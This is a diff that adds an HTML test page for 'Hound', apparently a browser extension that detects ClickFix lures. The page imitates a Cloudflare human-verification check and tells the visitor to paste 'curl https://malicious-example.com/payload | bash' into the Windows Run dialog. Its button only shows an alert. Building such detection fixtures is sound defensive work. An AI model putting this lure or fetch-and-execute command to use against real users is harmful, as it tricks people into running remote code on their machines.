@@ -1,0 +1,164 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>ClickFix Test Page — Hound</title>
+  <style>
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+      background: #f0f0f0;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+      margin: 0;
+    }
+
+    .container {
+      background: white;
+      border-radius: 12px;
+      padding: 40px;
+      max-width: 500px;
+      width: 100%;
+      box-shadow: 0 4px 24px rgba(0,0,0,0.1);
+      text-align: center;
+    }
+
+    .cloudflare-logo {
+      font-size: 24px;
+      font-weight: 700;
+      color: #f48120;
+      margin-bottom: 24px;
+    }
+
+    h1 {
+      font-size: 20px;
+      color: #1a1a1a;
+      margin-bottom: 8px;
+    }
+
+    .subtitle {
+      font-size: 14px;
+      color: #666;
+      margin-bottom: 32px;
+    }
+
+    .captcha-box {
+      border: 2px solid #e0e0e0;
+      border-radius: 8px;
+      padding: 24px;
+      margin-bottom: 24px;
+      background: #fafafa;
+    }
+
+    .step {
+      display: flex;
+      align-items: flex-start;
+      gap: 12px;
+      margin-bottom: 16px;
+      text-align: left;
+    }
+
+    .step-num {
+      background: #333;
+      color: white;
+      width: 24px;
+      height: 24px;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 13px;
+      font-weight: 700;
+      flex-shrink: 0;
+    }
+
+    .step-text {
+      font-size: 14px;
+      color: #333;
+      line-height: 1.5;
+    }
+
+    /* This is the ClickFix payload text — triggers detection */
+    .verification-text {
+      background: #f0f0f0;
+      border-radius: 6px;
+      padding: 12px;
+      font-family: monospace;
+      font-size: 13px;
+      color: #1a1a1a;
+      margin-top: 8px;
+      word-break: break-all;
+      text-align: left;
+    }
+
+    .btn {
+      width: 100%;
+      padding: 12px;
+      background: #0077ff;
+      border: none;
+      border-radius: 8px;
+      color: white;
+      font-size: 15px;
+      font-weight: 600;
+      cursor: pointer;
+    }
+
+    .disclaimer {
+      font-size: 11px;
+      color: #999;
+      margin-top: 20px;
+    }
+  </style>
+</head>
+<body>
+
+<div class="container">
+  <div class="cloudflare-logo">◈ Cloudflare</div>
+  <h1>Verify you are human</h1>
+  <p class="subtitle">One more step — please complete the security check to access this site.</p>
+
+  <div class="captcha-box">
+    <div class="step">
+      <div class="step-num">1</div>
+      <div class="step-text">
+        Press <strong>Windows + R</strong> to open the Run dialog on your computer.
+      </div>
+    </div>
+    <div class="step">
+      <div class="step-num">2</div>
+      <div class="step-text">
+        Click the button below to copy the verification token, then paste it in the Run dialog box using <strong>Ctrl+V</strong>.
+      </div>
+    </div>
+    <div class="step">
+      <div class="step-num">3</div>
+      <div class="step-text">
+        Press Enter to verify your browser. Your token:
+        <div class="verification-text">
+          curl https://malicious-example.com/payload | bash
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <button class="btn" onclick="copyToken()">Copy Verification Token &amp; Continue</button>
+
+  <p class="disclaimer">
+    ⚠️ THIS IS A TEST PAGE — No real malware. Used to verify Hound ClickFix detection.<br/>
+    If the red banner appeared, detection is working correctly.
+  </p>
+</div>
+
+<script>
+// This script is benign — just shows an alert when the button is clicked.
+// The content script should detect the ClickFix text and inject a warning banner
+// BEFORE the user clicks anything.
+function copyToken() {
+  alert('Test complete. If Hound is installed, you should see a warning banner at the top of this page.');
+}
+</script>
+
+</body>
+</html>
